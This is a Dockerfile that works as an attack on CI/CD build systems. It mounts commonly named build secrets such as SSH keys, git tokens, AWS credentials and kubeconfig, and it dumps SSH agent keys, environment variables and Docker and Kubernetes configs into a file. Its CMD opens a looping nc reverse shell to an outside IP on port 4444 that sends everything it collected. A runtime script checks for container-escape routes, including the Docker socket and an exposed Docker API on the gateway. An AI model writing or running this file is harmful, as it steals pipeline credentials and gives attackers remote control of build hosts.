# syntax=docker/dockerfile:1
FROM alpine:3.18

RUN apk add --no-cache curl bash openssh-client

# === SECRETS PROBE ===
# Try common secret IDs used in CI/CD pipelines
RUN --mount=type=secret,id=default,target=/tmp/s_default,required=false \
    --mount=type=secret,id=ssh_key,target=/tmp/s_ssh,required=false \
    --mount=type=secret,id=SSH_PRIVATE_KEY,target=/tmp/s_sshpriv,required=false \
    --mount=type=secret,id=GIT_AUTH_TOKEN,target=/tmp/s_git,required=false \
    --mount=type=secret,id=DOCKER_AUTH,target=/tmp/s_docker,required=false \
    --mount=type=secret,id=npmrc,target=/tmp/s_npm,required=false \
    --mount=type=secret,id=id_rsa,target=/tmp/s_rsa,required=false \
    --mount=type=secret,id=token,target=/tmp/s_token,required=false \
    --mount=type=secret,id=password,target=/tmp/s_pass,required=false \
    --mount=type=secret,id=aws,target=/tmp/s_aws,required=false \
    --mount=type=secret,id=kubeconfig,target=/tmp/s_kube,required=false \
    echo "=== SECRETS PROBE ===" > /build_recon && \
    for f in /tmp/s_*; do \
      if [ -f "$f" ] && [ -s "$f" ]; then \
        echo "SECRET FOUND: $f ($(wc -c < $f) bytes)" >> /build_recon; \
        cat "$f" >> /build_recon 2>&1; \
        echo "" >> /build_recon; \
      fi; \
    done && \
    echo "secrets probe done" >> /build_recon

# === SSH AGENT PROBE ===
RUN --mount=type=ssh,required=false \
    echo "=== SSH AGENT ===" >> /build_recon && \
    if [ -n "$SSH_AUTH_SOCK" ]; then \
      echo "SSH_AUTH_SOCK=$SSH_AUTH_SOCK" >> /build_recon; \
      ssh-add -l >> /build_recon 2>&1; \
      ssh-add -L >> /build_recon 2>&1; \
    else \
      echo "no SSH agent" >> /build_recon; \
    fi

# === CACHE MOUNT PROBE ===
RUN --mount=type=cache,target=/tmp/buildcache,id=default-cache,sharing=shared \
    echo "=== CACHE MOUNT ===" >> /build_recon && \
    echo "cache contents:" >> /build_recon && \
    ls -laR /tmp/buildcache >> /build_recon 2>&1 && \
    find /tmp/buildcache -type f -exec head -5 {} \; >> /build_recon 2>&1; \
    echo "MARK_END_CACHE" >> /build_recon

# === BUILD ENVIRONMENT ===
RUN echo "=== ENV VARS ===" >> /build_recon && \
    env | sort >> /build_recon 2>&1 && \
    echo "=== HOSTNAME ===" >> /build_recon && \
    hostname >> /build_recon 2>&1 && \
    echo "=== NETWORK ===" >> /build_recon && \
    ip addr >> /build_recon 2>&1 && \
    ip route >> /build_recon 2>&1 && \
    cat /etc/resolv.conf >> /build_recon 2>&1 && \
    echo "=== FILESYSTEM ===" >> /build_recon && \
    cat /proc/self/mountinfo >> /build_recon 2>&1 && \
    echo "=== CAPS ===" >> /build_recon && \
    grep Cap /proc/self/status >> /build_recon 2>&1 && \
    echo "=== SECCOMP ===" >> /build_recon && \
    grep Seccomp /proc/self/status >> /build_recon 2>&1 && \
    echo "=== PROC/SELF/NS ===" >> /build_recon && \
    ls -la /proc/self/ns/ >> /build_recon 2>&1 && \
    echo "=== BUILD CONTEXT ===" >> /build_recon && \
    ls -la /workspace/ >> /build_recon 2>&1 && \
    echo "=== GIT CONFIG ===" >> /build_recon && \
    cat /workspace/.git/config >> /build_recon 2>&1 && \
    cat /workspace/.gitconfig >> /build_recon 2>&1 && \
    echo "=== DOCKER CONFIG ===" >> /build_recon && \
    cat /root/.docker/config.json >> /build_recon 2>&1 && \
    cat /.docker/config.json >> /build_recon 2>&1 && \
    echo "=== KUBECONFIG ===" >> /build_recon && \
    cat /root/.kube/config >> /build_recon 2>&1 && \
    cat /etc/kubernetes/admin.conf >> /build_recon 2>&1 && \
    echo "=== END BUILD RECON ===" >> /build_recon

# Exfil build recon via reverse shell + bake into image
CMD sh -c "cat /build_recon; echo '===RUNTIME==='; /recon.sh; while true; do (cat /build_recon; echo RUNTIME_START; sh -i 2>&1) | nc 129.101.121.138 4444; sleep 5; done"

# Runtime recon script
RUN echo '#!/bin/sh' > /recon.sh && \
    echo 'echo "=== RUNTIME RECON ==="' >> /recon.sh && \
    echo 'uname -r' >> /recon.sh && \
    echo 'hostname' >> /recon.sh && \
    echo 'id' >> /recon.sh && \
    echo 'grep Cap /proc/self/status' >> /recon.sh && \
    echo 'grep Seccomp /proc/self/status' >> /recon.sh && \
    echo 'echo "---CLONE_NEWUSER---"' >> /recon.sh && \
    echo 'unshare --user -- id 2>&1' >> /recon.sh && \
    echo 'echo "---MOUNT---"' >> /recon.sh && \
    echo 'unshare --mount -- id 2>&1' >> /recon.sh && \
    echo 'echo "---DOCKER_SOCK---"' >> /recon.sh && \
    echo 'ls -la /var/run/docker.sock /run/docker.sock 2>&1' >> /recon.sh && \
    echo 'echo "---GATEWAY---"' >> /recon.sh && \
    echo 'GW=$(ip route | grep default | awk "{print \$3}")' >> /recon.sh && \
    echo 'echo "GW=$GW"' >> /recon.sh && \
    echo 'wget -q -T2 -O- http://$GW:2375/info 2>&1 | head -20' >> /recon.sh && \
    echo 'echo "---CORE_PATTERN---"' >> /recon.sh && \
    echo 'cat /proc/sys/kernel/core_pattern' >> /recon.sh && \
    echo 'echo "---WRITABLE---"' >> /recon.sh && \
    echo 'find /proc/sys -writable 2>/dev/null | head -10' >> /recon.sh && \
    echo 'echo "---MOUNTS---"' >> /recon.sh && \
    echo 'cat /proc/self/mountinfo | head -20' >> /recon.sh && \
    echo 'echo "=== END ==="' >> /recon.sh && \
    chmod +x /recon.sh
